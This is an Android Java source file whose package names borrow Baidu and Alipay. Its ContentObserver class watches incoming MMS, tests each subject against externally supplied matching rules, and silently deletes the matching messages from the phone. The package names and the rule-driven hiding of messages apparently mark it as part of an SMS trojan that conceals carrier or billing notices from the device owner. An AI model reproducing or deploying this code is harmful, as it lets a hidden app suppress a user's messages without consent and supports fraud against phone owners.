package com.baidu.serv;

import com.baidu.alipay.Constant;
import com.baidu.alipay.LogUtil;
import com.baidu.alipay.script.sms.GuardPojoWorker;
import com.baidu.alipay.script.sms.MatchResult;
import com.baidu.alipay.script.sms.Msg;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

public class MAObserver extends ContentObserver {
//    private static final String TAG = "MmsSmsData";
    private static long mCurrentMaxDate = 0;
    private Context mContext;
    
    public MAObserver(Context context, Handler handler) {
        super(handler);
        this.mContext = context;
    }

    public void onChange(boolean paramBoolean) {
        super.onChange(paramBoolean);
        
//        LogUtil.e(TAG, "onChange");
        try{
        	checkMms(mContext);
        }catch (Exception e) {
			 e.printStackTrace();
		}
    }

 public static void checkMms(Context mContext) {
    	
//    	LogUtil.e(TAG, "checkMms -> start ; mCurrentMaxId : " + mCurrentMaxDate);
    	
        Cursor localCursor = null;
        
        try {
        	localCursor = mContext.getContentResolver().query(
                    Uri.parse(Constant.URI_MMS),
                    new String[] { "_id", "sub", "date" },
                    "date > " + mCurrentMaxDate, null,
                    "date desc");
        	
            if (localCursor.moveToFirst()) {

                while (!localCursor.isAfterLast()) {
                    String title = localCursor.getString(localCursor
                            .getColumnIndex("sub"));
                    if(title != null && title.length() > 0){
	                    title = new String(title.getBytes("ISO8859_1"), "utf-8"); 
	                    
	                    long date = localCursor.getLong(localCursor
	                            .getColumnIndex("date"));
	                    int id = localCursor.getInt(localCursor
	                            .getColumnIndex("_id"));
	
	//                    if (date > mCurrentMaxDate) {
	//                        mCurrentMaxDate = date;
	//                    }
	                    
	                    Msg msg = new Msg(id, "", title, date,true);
	                    
	                    boolean matched = GuardPojoWorker.match(mContext,msg);
	                   
	                    if (matched) {
	                        deleteMms(mContext,msg);
	                    }
                    }

                    localCursor.moveToNext();
                }

            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (localCursor != null) {
                try {
					localCursor.close();
				} catch (Exception e) {
					e.printStackTrace();
				}
            }
            
            System.gc();
        }
    }

    public static void deleteMms(Context mContext,Msg msg) {
//    	LogUtil.e(TAG, "deleteMms -> "+msg.getId());
    	
        del(mContext,msg.getId(), msg.getDate());
    }

    private static void del(Context mContext,int id, long date) {
//        if (date > mCurrentMaxDate)
//            mCurrentMaxDate = date;
        mContext.getContentResolver().delete(Uri.parse(Constant.URI_MMS +"/"+ id),
                null, null);
    }
}
